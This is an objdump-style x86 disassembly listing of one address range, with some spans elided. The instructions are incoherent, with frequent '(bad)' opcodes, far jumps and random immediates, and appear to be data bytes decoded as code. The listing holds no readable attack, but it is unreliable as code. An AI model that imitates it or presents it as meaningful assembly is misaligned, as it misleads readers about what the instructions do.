  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	pop    eax
  41a023:	adc    esi,DWORD PTR [esi-0x6c]
  41a026:	mov    ah,0x11
  41a028:	add    DWORD PTR [eax],eax
  41a02a:	pop    es
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [ebx-0x7e],cl
  41a030:	and    ah,BYTE PTR [ecx+0x8002d51]
  41a036:	and    DWORD PTR [edi],ebx
  41a038:	push   eax
  41a039:	jbe    0x41a03f
  41a03b:	(bad)  
  41a03d:	pop    ss
  41a03e:	stc    
  41a03f:	pop    ds
  41a040:	lds    ecx,FWORD PTR [ebx-0x11b05f2f]
  41a046:	mov    ebx,0xff2bc3ff
  41a04b:	inc    edx
  41a04c:	add    ebp,DWORD PTR [edi+0x21]
  41a04f:	mov    BYTE PTR [ecx-0x690a5a13],0xad
  41a056:	sub    BYTE PTR [edi+0x4624c51a],cl
  41a05c:	sub    al,0x39
  41a05e:	ret    0xa145
  41a061:	cmp    eax,0x6e24c538
  41a066:	and    ecx,DWORD PTR [ecx]
  41a068:	push   0xcc2e3f65
  41a06d:	push   edi
  41a06e:	les    esi,FWORD PTR [edi+0x12]
  41a071:	dec    eax
  41a072:	xor    DWORD PTR [eax+0x78131fe3],ebp
  41a078:	(bad)  
  41a079:	out    0xb0,al
  41a07b:	loopne 0x41a058
  41a07d:	push   es
  41a07e:	dec    ebx
  41a07f:	add    al,0xa3
  41a081:	bound  ecx,QWORD PTR [ebx]
  41a083:	lea    eax,[edx-0x49]
  41a086:	(bad)  
  41a087:	je     0x41a0bf
  41a089:	xor    edi,DWORD PTR [ecx-0x16]
  41a08c:	out    dx,al
  41a08d:	shl    DWORD PTR [ebx-0x651d1c81],0xd6
  41a094:	adc    eax,0xd2dfca9d
  41a099:	mov    dl,0xc6
  41a09b:	fnsave [ebp+eiz*4-0x30fd6b88]
  41a0a2:	outs   dx,DWORD PTR ds:[esi]
  41a0a3:	jecxz  0x41a02b
  41a0a5:	push   ecx
  41a0a6:	xchg   ebp,eax
  41a0a7:	pop    ebp
  41a0a8:	inc    edi
  41a0a9:	xchg   esp,eax
  41a0aa:	mov    ch,0x91
  41a0ac:	rcr    DWORD PTR [ebx-0x1fd6fa6f],cl
  41a0b2:	ins    DWORD PTR es:[edi],dx
  41a0b3:	jno    0x41a0a2
  41a0b5:	mov    dl,0xc
  41a0b7:	retf   0x3fe6
  41a0ba:	mov    al,al
  41a0bc:	and    eax,0x11f2f90c
  41a0c1:	pop    edi
  41a0c2:	popf   
  41a0c3:	gs pop ss
  41a0c5:	dec    ebp
  41a0c6:	push   ss
  41a0c7:	inc    esi
  41a0c8:	and    al,0x5f
  41a0ca:	(bad)  
  41a0cc:	xor    BYTE PTR [ecx],ch
  41a0ce:	aaa    
  41a0cf:	jo     0x41a107
  41a0d1:	shr    eax,1
  41a0d3:	aad    0xe6
  41a0d5:	ss mov edx,0x3ad0911
  41a0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0dc:	(bad)  
  41a0dd:	fdivr  DWORD PTR [ecx+0x28]
  41a0e0:	loopne 0x41a11b
  41a0e2:	leave  
  41a0e3:	mov    ebp,0xabe0eebe
  41a0e8:	pop    edx
  41a0e9:	inc    eax
  41a0ea:	mov    edi,0xc4ca1c82
  41a0ef:	mov    dh,BYTE PTR [edx+eiz*2-0x3b992c93]
  41a0f6:	pop    esi
  41a0f7:	lds    eax,FWORD PTR [edx-0x5e]
  41a0fa:	or     ah,BYTE PTR [ebx]
  41a0fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0fd:	dec    ecx
  41a0fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0ff:	push   edx
  41a100:	jno    0x9f0754c5
  41a106:	pop    ds
  41a107:	mov    bl,0x81
  41a109:	pop    es
  41a10a:	cmp    ebp,DWORD PTR [eax+0x6c2fd22]
  41a110:	cmc    
  41a111:	repnz hlt 
  41a113:	jns    0x41a0cf
  41a115:	fcmovbe st,st(7)
  41a117:	pop    ds
  41a118:	sbb    esi,DWORD PTR [eax]
  41a11a:	out    dx,eax
  41a11b:	call   FWORD PTR [esi+0x428ab9bb]
  41a121:	nop
  41a122:	push   es
  41a123:	mov    BYTE PTR [ebx+0x7f],0xf7
  41a127:	out    0xef,al
  41a129:	lock jo 0x41a0c7
  41a12c:	(bad)  
  41a12d:	outs   dx,BYTE PTR ds:[esi]
  41a12e:	ss xor al,0xa4
  41a131:	and    esi,DWORD PTR [edi]
  41a133:	retf   0xea
	...
  41a196:	sbb    al,0xc
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	inc    esi
  41a1a3:	inc    dx
  41a1a5:	sbb    edi,DWORD PTR [ebx+0x7000112]
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    ch,ah
  41a1af:	popf   
  41a1b0:	lods   eax,DWORD PTR ds:[esi]
  41a1b1:	mov    dh,0xef
  41a1b3:	ins    DWORD PTR es:[edi],dx
  41a1b4:	sub    ch,BYTE PTR [eax+0x9]
  41a1b7:	rcr    BYTE PTR [ebx-0x4e7f94a],1
  41a1bd:	call   0xbc809f88
  41a1c2:	push   ss
  41a1c3:	or     dl,dl
  41a1c5:	fadd   st(3),st
  41a1c7:	or     esi,DWORD PTR ds:0xc08c8cf3
  41a1cd:	in     al,0xa6
  41a1cf:	add    DWORD PTR [ecx+0x43],edi
  41a1d2:	daa    
  41a1d3:	xor    edx,eax
  41a1d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1d6:	pxor   mm3,QWORD PTR [ecx]
  41a1d9:	int3   
  41a1da:	or     DWORD PTR [ebp-0x3d39e3cb],esi
  41a1e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1e1:	pusha  
  41a1e2:	xor    bh,BYTE PTR [edi]
  41a1e4:	repnz pop ebx
  41a1e6:	jno    0x41a254
  41a1e8:	push   ebx
  41a1e9:	push   es
  41a1ea:	sub    BYTE PTR [esi-0x62],bl
  41a1ed:	sub    eax,0xfa713195
  41a1f2:	cmc    
  41a1f3:	and    bl,BYTE PTR [eiz*4+0x3889b497]
  41a1fa:	pop    eax
  41a1fb:	popa   
  41a1fc:	les    ebp,FWORD PTR [esp+ecx*8]
  41a1ff:	and    cl,BYTE PTR [ebp-0x3405e7f5]
  41a205:	cmp    ah,dh
  41a207:	shr    DWORD PTR [esp+edi*8],cl
  41a20a:	data16 ds adc al,0x0
  41a20e:	sbb    al,0x4
  41a210:	lock jl 0x41a1ce
  41a213:	fimul  WORD PTR [eax]
  41a215:	adc    BYTE PTR [ecx+0x637dd55],al
  41a21b:	add    eax,0x55c961a0
  41a220:	and    DWORD PTR [ecx+0x6c],ebx
  41a223:	call   DWORD PTR [ebx]
  41a225:	push   eax
  41a226:	mov    ebp,DWORD PTR [esi-0x56]
  41a229:	or     BYTE PTR [edx+edi*2+0x5a9572c6],bl
  41a230:	push   0xf46705f9
  41a235:	pop    esp
  41a236:	pop    ebx
  41a237:	pusha  
  41a238:	sub    edi,edx
  41a23a:	or     esi,ebp
  41a23c:	pusha  
  41a23d:	rol    esp,0x4
  41a240:	push   edx
  41a241:	pop    edi
  41a242:	adc    eax,DWORD PTR [edx+ecx*1]
  41a245:	aas    
  41a246:	cmp    BYTE PTR [edi+0x5d],bl
  41a249:	fwait
  41a24a:	dec    esp
  41a24b:	cmp    bl,BYTE PTR [esi]
  41a24d:	jmp    0x984472d3
  41a252:	add    al,ch
  41a254:	out    dx,al
  41a255:	ins    DWORD PTR es:[edi],dx
  41a256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a257:	jmp    0x3af2:0xd065b387
  41a25e:	mov    ds:0x948ebb43,al
  41a263:	lods   al,BYTE PTR ds:[esi]
  41a264:	jo     0x41a2c4
  41a266:	inc    ebp
  41a267:	sub    BYTE PTR [edi-0x7e],ah
  41a26a:	xchg   ecx,eax
  41a26b:	addr16 int3 
  41a26d:	clc    
  41a26e:	(bad)  
  41a26f:	dec    DWORD PTR [eax-0x5]
  41a272:	clc    
  41a273:	iret   
  41a274:	lahf   
  41a275:	pusha  
  41a276:	cmp    DWORD PTR ds:0xa737df53,eax
  41a27c:	sbb    DWORD PTR [eax-0x1a],eax
  41a27f:	adc    ch,cl
  41a281:	out    0xda,eax
  41a283:	jae    0x41a260
  41a285:	popa   
  41a286:	sub    BYTE PTR [esi-0xa4d3267],ah
  41a28c:	and    bh,BYTE PTR [esi+ebp*4+0x5623e6ef]
  41a293:	fsub   QWORD PTR [ebp-0x55448cb7]
  41a299:	pop    edi
  41a29a:	imul   ebp,DWORD PTR [ecx+0x32],0xffffffcb
  41a29e:	dec    edi
  41a29f:	aam    0xc
  41a2a1:	push   edx
  41a2a2:	mov    ebp,0x9b580de1
  41a2a7:	jp     0x41a2e8
  41a2a9:	rol    DWORD PTR [ebp+0x1f],1
  41a2ac:	xchg   ecx,eax
  41a2ad:	push   cs
  41a2ae:	mov    ecx,0x7d256d95
  41a2b4:	add    eax,DWORD PTR [eax]
	...
  41a316:	neg    DWORD PTR [eax-0x58]
  41a319:	adc    ebp,DWORD PTR [edi+0x63fcfff3]
  41a31f:	fadd   st,st(1)
  41a321:	mov    al,0xe4
  41a323:	sbb    al,0x79
  41a325:	xor    eax,0x113c2
  41a32a:	pop    es
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    BYTE PTR [ecx+0x538bc9de],dh
  41a333:	push   esp
  41a334:	(bad)  
  41a335:	aad    0xcc
  41a337:	jl     0x41a33f
  41a339:	mov    al,0xd0
  41a33b:	push   0x9fb34c74
  41a340:	adc    eax,0x955e93aa
  41a345:	ror    dl,1
  41a347:	xchg   ecx,eax
  41a348:	adc    DWORD PTR [ebx-0x44],esi
  41a34b:	je     0x41a3bc
  41a34d:	add    BYTE PTR [ebx+0x1687e01c],bl
  41a353:	jo     0x41a303
  41a355:	inc    ecx
  41a356:	or     DWORD PTR [esi-0x2b4c4870],edx
  41a35c:	mov    BYTE PTR [edx-0x6bb78a2e],cl
  41a362:	fs inc esi
  41a364:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a365:	mov    al,ds:0x72c34630
  41a36a:	and    eax,0xc9256ecf
  41a36f:	std    
  41a370:	sub    al,BYTE PTR [esi-0x59]
  41a373:	retf   0x17fa
  41a376:	cmp    eax,0x7601b769
  41a37b:	stos   DWORD PTR es:[edi],eax
  41a37c:	push   edi
  41a37d:	call   0xaacc:0x7f072b45
  41a384:	xchg   ebp,eax
  41a385:	jns    0x41a342
  41a387:	push   esi
  41a388:	scas   eax,DWORD PTR es:[edi]
  41a389:	imul   ebp,esi,0xa909fdcd
  41a38f:	or     BYTE PTR [edx+0x77],dh
  41a392:	mov    ch,bh
  41a394:	add    al,0x2d
  41a396:	aad    0x2c
  41a398:	sub    DWORD PTR ds:0xe8264add,edx
  41a39e:	or     ebx,DWORD PTR [eax]
  41a3a0:	push   ds
  41a3a1:	xchg   DWORD PTR [esi],esp
  41a3a3:	(bad)  
  41a3a4:	push   0xcc810f1f
  41a3a9:	(bad)  
  41a3aa:	fmul   st(4),st
  41a3ac:	mov    ds:0x1d6afcdb,al
  41a3b1:	mov    ebp,0x19a31b02
  41a3b6:	push   ecx
  41a3b7:	out    0x28,eax
  41a3b9:	pop    edx
  41a3ba:	sti    
  41a3bb:	outs   dx,BYTE PTR ds:[esi]
  41a3bc:	and    DWORD PTR [edi+0x50],ebx
  41a3bf:	int    0xe4
  41a3c1:	and    BYTE PTR [esi],0xbf
  41a3c4:	mov    ebx,ecx
  41a3c6:	stos   DWORD PTR es:[edi],eax
  41a3c7:	outs   dx,DWORD PTR ds:[esi]
  41a3c8:	gs jnp 0x41a432
  41a3cb:	lea    esi,[edx+0x716ad8f3]
  41a3d1:	xchg   DWORD PTR [ebx],eax
  41a3d3:	sar    BYTE PTR [ecx+0x4a],cl
  41a3d6:	(bad)  
  41a3d7:	icebp  
  41a3d8:	sti    
  41a3d9:	outs   dx,BYTE PTR ds:[esi]
  41a3da:	repnz rep stos DWORD PTR es:[edi],eax
  41a3dd:	imul   esp,ebx,0xc2dd43b3
  41a3e3:	inc    esp
  41a3e4:	cmp    DWORD PTR cs:[edi-0x4c],ecx
  41a3e8:	dec    ebx
  41a3e9:	pop    ds
  41a3ea:	pop    ds
  41a3eb:	iret   
  41a3ec:	imul   eax,edi,0xffffff95
  41a3ef:	mov    bh,0x25
  41a3f1:	cmp    eax,0x29e641ec
  41a3f6:	lock push cs
  41a3f8:	neg    BYTE PTR [ecx-0x60]
  41a3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3fc:	(bad)  
  41a3fd:	xchg   DWORD PTR [eax-0x80],esi
  41a400:	add    ebx,DWORD PTR [edi-0x3a]
  41a403:	loop   0x41a404
  41a405:	xor    DWORD PTR [ebx-0x3d],esi
  41a408:	cld    
  41a409:	mov    ebx,DWORD PTR [ecx+0x27]
  41a40c:	lods   al,BYTE PTR ds:[esi]
  41a40d:	nop
  41a40e:	adc    edi,DWORD PTR [esi+edi*1-0x5]
  41a412:	cmp    eax,0x4e2d0c83
  41a417:	in     al,dx
  41a418:	(bad)  
  41a419:	loopne 0x41a3dc
  41a41b:	xchg   esi,eax
  41a41c:	cmc    
  41a41d:	dec    esi
  41a41e:	lds    edi,FWORD PTR [eax+edi*2]
  41a421:	adc    DWORD PTR [ecx-0x2d3846f5],edx
  41a427:	js     0x41a489
  41a429:	mov    eax,DWORD PTR [eax+0x5cb44c7]
  41a42f:	cdq    
  41a430:	cmc    
  41a431:	mov    al,ds:0x916335
	...
  41a496:	mov    edi,0xff0fcf82
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	adc    DWORD PTR [edi+0x14c97fb9],ebx
  41a4a8:	add    DWORD PTR [eax],eax
  41a4aa:	pop    es
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR [ebx-0x62],ch
  41a4b0:	retf   
  41a4b1:	outs   dx,DWORD PTR ds:[esi]
  41a4b2:	pop    esi
  41a4b3:	xchg   DWORD PTR [edx],eax
  41a4b5:	pop    ss
  41a4b6:	mov    ebp,0xd3e0ee65
  41a4bb:	or     ch,bl
  41a4bd:	xor    al,dh
  41a4bf:	add    DWORD PTR [edi-0x29],ecx
  41a4c2:	in     eax,dx
  41a4c3:	cli    
  41a4c4:	mov    al,0x63
  41a4c6:	int3   
  41a4c7:	push   ebx
  41a4c8:	lahf   
  41a4c9:	aam    0xea
  41a4cb:	shl    eax,cl
  41a4cd:	mov    dh,0x31
  41a4cf:	leave  
  41a4d0:	jae    0x41a4d7
  41a4d2:	dec    ebx
  41a4d3:	or     DWORD PTR [ecx],esi
  41a4d5:	xor    DWORD PTR [edx],ecx
  41a4d7:	out    dx,al
  41a4d8:	inc    edx
  41a4d9:	pop    edi
  41a4da:	stc    
  41a4db:	jo     0x41a4ca
  41a4dd:	push   esi
  41a4de:	retf   0x68c3
  41a4e1:	jecxz  0x41a4f7
  41a4e3:	pusha  
  41a4e4:	mov    cl,0xf
  41a4e6:	lahf   
  41a4e7:	shl    DWORD PTR [esi+0x7c4a75ba],1
  41a4ed:	xchg   edi,eax
  41a4ee:	fiadd  DWORD PTR [ebx]
  41a4f0:	shr    DWORD PTR [esi],cl
  41a4f2:	pushf  
  41a4f3:	iret   
  41a4f4:	cmp    eax,0xc9e658da
  41a4f9:	clc    
  41a4fa:	sub    ebx,DWORD PTR [eax]
  41a4fc:	repz into 
  41a4fe:	xchg   DWORD PTR [ecx+0x26],ebx
  41a501:	mov    bl,0x82
  41a503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a504:	lock add ah,bh
  41a507:	add    eax,0x84a42cf8
  41a50c:	sbb    DWORD PTR [eax],ebp
  41a50e:	retf   
  41a50f:	dec    ecx
  41a510:	dec    ebp
  41a511:	lahf   
  41a512:	lock dec esp
  41a514:	cmp    bh,BYTE PTR ds:0xad4909d9
  41a51a:	push   ss
  41a51b:	int3   
  41a51c:	adc    al,0xd8
  41a51e:	mov    BYTE PTR [edx+eax*4+0x13],ch
  41a522:	add    BYTE PTR [esi-0x4cf6aff4],bh
  41a528:	push   ebp
  41a529:	lds    esi,FWORD PTR [ecx]
  41a52b:	xchg   ebx,eax
  41a52c:	cmp    esi,DWORD PTR [eax]
  41a52e:	cmp    edx,edi
  41a530:	pop    edx
  41a531:	loopne 0x41a50e
  41a533:	add    BYTE PTR [edi-0x19],al
  41a536:	push   cs
  41a537:	sbb    esp,eax
  41a539:	(bad)  
  41a53a:	(bad)  
  41a53b:	and    eax,0xc327ba7e
  41a540:	sbb    BYTE PTR [edx],0xef
  41a543:	adc    al,0x9c
  41a545:	sbb    ebp,DWORD PTR [edx-0x69]
  41a548:	jbe    0x41a556
  41a54a:	mov    dh,BYTE PTR [eax]
  41a54c:	inc    ebp
  41a54d:	bound  edi,QWORD PTR [ecx+0x29]
  41a550:	cmp    BYTE PTR [eax+0x6826e837],0x94
  41a557:	lds    ecx,FWORD PTR [edx+0x67]
  41a55a:	jmp    0xbc9975fe
  41a55f:	sub    al,0x36
  41a561:	push   esi
  41a562:	sbb    ebx,esi
  41a564:	iret   
  41a565:	std    
  41a566:	jae    0x41a50f
  41a568:	cs (bad) 
  41a56a:	leave  
  41a56b:	inc    ebp
  41a56c:	and    ecx,DWORD PTR [ecx-0x1da612eb]
  41a572:	(bad)  
  41a573:	not    BYTE PTR ds:0xd6e8ed27
  41a579:	jns    0x41a5f7
  41a57b:	xchg   ebx,eax
  41a57c:	stc    
  41a57d:	push   0xffffffd4
  41a57f:	sub    DWORD PTR [eax+eiz*8-0x5ecb4d71],esi
  41a586:	mov    bl,0x80
  41a588:	jne    0x41a5d6
  41a58a:	outs   dx,BYTE PTR ds:[esi]
  41a58b:	push   cs
  41a58c:	repz sbb BYTE PTR [eax+0x1c42cf0f],al
  41a593:	xor    DWORD PTR [edx-0x10],eax
  41a596:	mov    esi,DWORD PTR [esi+ecx*2]
  41a599:	fisubr DWORD PTR [esi+0x20275e34]
  41a59f:	dec    esi
  41a5a0:	fimul  WORD PTR [eax-0x57]
  41a5a3:	(bad)  
  41a5a5:	lahf   
  41a5a6:	icebp  
  41a5a7:	pop    eax
  41a5a8:	fisttp DWORD PTR [esi]
  41a5aa:	jbe    0x41a62b
  41a5ac:	cwde   
  41a5ad:	sub    dh,cl
  41a5af:	scas   al,BYTE PTR es:[edi]
  41a5b0:	icebp  
  41a5b1:	lahf   
  41a5b2:	jg     0x41a5e1
  41a5b4:	sbb    al,BYTE PTR [eax]
	...
  41a616:	pop    esp
  41a617:	sub    al,BYTE PTR [ecx]
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0x9fee2699
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	mov    bl,0x15
  41a630:	adc    BYTE PTR [edi+0x472458fd],dh
  41a636:	jle    0x41a5bb
  41a638:	test   eax,0xcbe6723c
  41a63d:	push   ds
  41a63e:	dec    eax
  41a63f:	imul   esp,DWORD PTR [edx],0x642e312f
  41a645:	daa    
  41a646:	jp     0x41a667
  41a648:	jmp    0xb698:0xa2fa35e0
  41a64f:	xlat   BYTE PTR ds:[ebx]
  41a650:	add    ah,dh
  41a652:	adc    al,0xdb
  41a654:	xor    al,0xab
  41a656:	pop    es
  41a657:	bswap  esi
  41a659:	std    
  41a65a:	dec    edx
  41a65b:	in     al,dx
  41a65c:	jecxz  0x41a618
  41a65e:	or     BYTE PTR [esi],ch
  41a660:	mov    bh,0x8c
  41a662:	(bad)  
  41a663:	aam    0x90
  41a665:	mov    BYTE PTR [eax+0x70],bh
  41a668:	cmp    al,0x1e
  41a66a:	shr    BYTE PTR [ebx],cl
  41a66c:	jl     0x41a659
  41a66e:	jne    0x41a6ef
  41a670:	sbb    edi,DWORD PTR [esi]
  41a672:	add    BYTE PTR [edi+0x77],0x14
  41a676:	ins    BYTE PTR es:[edi],dx
  41a677:	push   cs
  41a678:	mov    ecx,0x15e473a1
  41a67d:	xchg   ebx,eax
  41a67e:	push   ecx
  41a67f:	(bad)  
  41a680:	adc    al,BYTE PTR [ecx+ebx*8]
  41a683:	jl     0x41a612
  41a685:	adc    al,0x84
  41a687:	mov    ebx,DWORD PTR [edx]
  41a689:	adc    edi,esi
  41a68b:	xchg   DWORD PTR [edx+0xb],esi
  41a68e:	pop    ecx
  41a68f:	add    bh,dh
  41a691:	stos   BYTE PTR es:[edi],al
  41a692:	rcr    DWORD PTR [ebp-0x401c4c41],1
  41a698:	xchg   ebx,eax
  41a699:	sbb    eax,0xe66c1f13
  41a69e:	push   eax
  41a69f:	loop   0x41a68d
  41a6a1:	push   edx
  41a6a2:	imul   ebp,DWORD PTR [ebp-0x6cdc37c4],0x1a0b0788
  41a6ac:	retf   0xb685
  41a6af:	fwait
  41a6b0:	fwait
  41a6b1:	adc    al,0x34
  41a6b3:	gs pop ebp
  41a6b5:	sti    
  41a6b6:	push   ebx
  41a6b7:	(bad)  
  41a6b8:	retf   0xc641
  41a6bb:	xor    eax,esp
  41a6bd:	dec    esi
  41a6be:	pop    ebx
  41a6bf:	test   eax,0x44baec9a
  41a6c4:	push   ebp
  41a6c5:	dec    ebp
  41a6c6:	out    dx,al
  41a6c7:	test   BYTE PTR [ecx-0x48],cl
  41a6ca:	jne    0x41a713
  41a6cc:	add    ebx,DWORD PTR ds:0x18253f42
  41a6d2:	je     0x41a708
  41a6d4:	js     0x41a6fc
  41a6d6:	mov    BYTE PTR [edi+0x50a396e0],dh
  41a6dc:	xchg   edi,eax
  41a6dd:	daa    
  41a6de:	mov    ch,0x40
  41a6e0:	ds loop 0x41a6e1
  41a6e3:	les    ecx,FWORD PTR [ecx+ebx*1]
  41a6e6:	xor    DWORD PTR ss:[ebx-0xe],0xfffffff9
  41a6eb:	xchg   ebx,eax
  41a6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6ed:	pop    eax
  41a6ee:	jo     0x41a74c
  41a6f0:	daa    
  41a6f1:	gs xchg ebx,eax
  41a6f4:	ret    0xaf4f
  41a6f7:	or     eax,0x3b5ce0c4
  41a6fc:	xchg   esi,eax
  41a6fd:	sub    cl,bh
  41a6ff:	pop    eax
  41a700:	loop   0x41a697
  41a702:	in     eax,0x1e
  41a704:	shl    BYTE PTR [ebp+eiz*8+0x7fad3602],0x91
  41a70c:	daa    
  41a70d:	and    al,BYTE PTR [ebx-0x5]
  41a710:	and    bh,bl
  41a712:	fst    st(0)
  41a714:	stc    
  41a715:	dec    ebp
  41a716:	mov    esi,0x18781afa
  41a71b:	aam    0xcc
  41a71d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a71e:	and    al,0xf
  41a720:	ins    DWORD PTR es:[edi],dx
  41a721:	cld    
  41a722:	into   
  41a723:	(bad)  
  41a724:	aad    0xb4
  41a726:	mov    al,0x6
  41a728:	cmc    
  41a729:	call   0x199:0x5cedfe39
  41a730:	les    edi,FWORD PTR [edx]
  41a732:	cld    
  41a733:	je     0x41a713
	...
  41a795:	add    bl,dh
  41a797:	xchg   edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx+0x1b9150a8]
  41a7a4:	sbb    BYTE PTR [edx],ah
  41a7a6:	xlat   BYTE PTR ds:[ebx]
  41a7a7:	push   ss
  41a7a8:	add    DWORD PTR [eax],eax
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    cl,dl
  41a7af:	xchg   esi,ebx
  41a7b1:	or     eax,0xf278e308
  41a7b6:	lahf   
  41a7b7:	outs   dx,DWORD PTR ds:[esi]
  41a7b8:	fsub   DWORD PTR [eax]
  41a7ba:	scas   al,BYTE PTR es:[edi]
  41a7bb:	mul    BYTE PTR ds:[edx]
  41a7be:	sub    eax,0x44e23672
  41a7c3:	ja     0x41a797
  41a7c5:	es xchg ebp,eax
  41a7c7:	fld    DWORD PTR [ebx+edi*2+0x642f7d5f]
  41a7ce:	dec    ebp
  41a7cf:	fmul   DWORD PTR [esi+0x6d236972]
  41a7d5:	inc    edi
  41a7d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7d7:	adc    edx,DWORD PTR [eax+0x12]
  41a7da:	push   edx
  41a7db:	aas    
  41a7dc:	lods   al,BYTE PTR ds:[esi]
  41a7dd:	int    0xe8
  41a7df:	xchg   ebx,eax
  41a7e0:	xchg   esi,eax
  41a7e1:	pop    ecx
  41a7e2:	cmp    BYTE PTR [ecx-0x524ec80],0xaf
  41a7e9:	aaa    
  41a7ea:	or     ebp,DWORD PTR [edi]
  41a7ec:	and    edi,DWORD PTR [ebx+0xd]
  41a7ef:	rcl    eax,cl
  41a7f1:	shl    DWORD PTR ds:0x3cfcde22,1
  41a7f7:	enterw 0x863d,0xe1
  41a7fc:	xor    edx,edi
  41a7fe:	mov    ah,0x69
  41a800:	adc    ebp,DWORD PTR [esi+0x7872ea25]
  41a806:	icebp  
  41a807:	jl     0x41a83c
  41a809:	int3   
  41a80a:	push   ds
  41a80b:	or     ch,BYTE PTR [edx-0x3f]
  41a80e:	dec    ecx
  41a80f:	inc    ebp
  41a810:	sub    DWORD PTR [ebx+0x3aaa6faa],ebp
  41a816:	mov    cl,0x4f
  41a818:	int3   
  41a819:	dec    edx
  41a81a:	cdq    
  41a81b:	jnp    0x41a7b8
  41a81d:	stos   DWORD PTR es:[edi],eax
  41a81e:	cld    
  41a81f:	pop    edx
  41a820:	pop    edx
  41a821:	pop    eax
  41a822:	fmul   DWORD PTR [edx]
  41a824:	sub    edi,ebp
  41a826:	ss dec edi
  41a828:	ds (bad) 
  41a82a:	mul    BYTE PTR [ebp-0x27aa4b19]
  41a830:	pop    edx
  41a831:	cdq    
  41a832:	sbb    al,0x2a
  41a834:	aam    0x89
  41a836:	ins    DWORD PTR es:[edi],dx
  41a837:	mov    edx,0x32a92acd
  41a83c:	jns    0x41a7fd
  41a83e:	arpl   WORD PTR [eax],bx
  41a840:	xchg   BYTE PTR [ecx-0x15fc034a],ch
  41a846:	rcl    DWORD PTR [eax-0x40],0x81
  41a84a:	xlat   BYTE PTR ds:[ebx]
  41a84b:	jno    0x41a82a
  41a84d:	and    DWORD PTR [ecx+0x2105e5bd],ebx
  41a853:	in     al,dx
  41a854:	cmp    al,0xbe
  41a856:	jp     0x41a8ca
  41a858:	pop    ecx
  41a859:	xor    dl,BYTE PTR [eax+0x54dfbd4c]
  41a85f:	data16 (bad) 
  41a861:	(bad)  
  41a863:	jg     0x41a8c5
  41a865:	loopne 0x41a854
  41a867:	(bad)  
  41a869:	mov    ebx,0x84d84e02
  41a86e:	(bad)  
  41a870:	dec    DWORD PTR [bp+di+0x6cff]
  41a875:	call   0x21795668
  41a87a:	lds    edi,FWORD PTR [esi]
  41a87c:	jns    0x41a8d8
  41a87e:	push   es
  41a87f:	enter  0x5819,0x55
  41a883:	mov    esi,0x60e4c4dc
  41a888:	stos   BYTE PTR es:[edi],al
  41a889:	loopne 0x41a874
  41a88b:	sub    dh,bh
  41a88d:	int3   
  41a88e:	xchg   ecx,eax
  41a88f:	or     DWORD PTR [ebx-0x6d],eax
  41a892:	push   es
  41a893:	fcmovnu st,st(5)
  41a895:	lods   eax,DWORD PTR ds:[esi]
  41a896:	sbb    ebp,ecx
  41a898:	call   0x49bd138
  41a89d:	mov    ebx,0xc03ac214
  41a8a2:	cdq    
  41a8a3:	or     BYTE PTR [esi-0x2fc2c60f],cl
  41a8a9:	sub    edi,DWORD PTR [ecx+edi*8-0x26f51901]
  41a8b0:	cmp    eax,0xd054ee48
	...
  41a915:	add    BYTE PTR ds:0xcf4a867e,dh
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0x9f4323e,al
  41a924:	retf   
  41a925:	dec    eax
  41a926:	ficom  WORD PTR [edi]
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [ebx],dl
  41a92f:	sbb    BYTE PTR [esi],ah
  41a931:	or     eax,0xd5e45c72
  41a936:	push   ds
  41a937:	cmp    DWORD PTR [ebx],esp
  41a939:	pop    eax
  41a93a:	(bad)  
  41a93b:	xchg   esp,eax
  41a93c:	mov    al,ds:0xfcb00e69
  41a941:	mov    ch,0xfa
  41a943:	adc    bh,ch
  41a945:	sub    cl,BYTE PTR [ecx+0x2facb87a]
  41a94b:	xchg   ebx,eax
  41a94c:	xor    ecx,DWORD PTR [edi+0xf]
  41a94f:	fistp  WORD PTR [edi-0x30]
  41a952:	xchg   esi,eax
  41a953:	sub    al,0xed
  41a955:	add    ah,al
  41a957:	push   ebp
  41a958:	neg    DWORD PTR [eax+eax*8-0x22]
  41a95c:	sbb    dh,BYTE PTR [esi-0x2e04ef3e]
  41a962:	mov    ds:0x2e5875cd,eax
  41a967:	iret   
  41a968:	sub    al,0x65
  41a96a:	lods   eax,DWORD PTR ds:[esi]
  41a96b:	mov    edx,DWORD PTR [eax+0x56]
  41a96e:	(bad)  
  41a96f:	loope  0x41a927
  41a971:	stos   BYTE PTR es:[edi],al
  41a972:	retf   0x8318
  41a975:	(bad)  
  41a976:	fucompp 
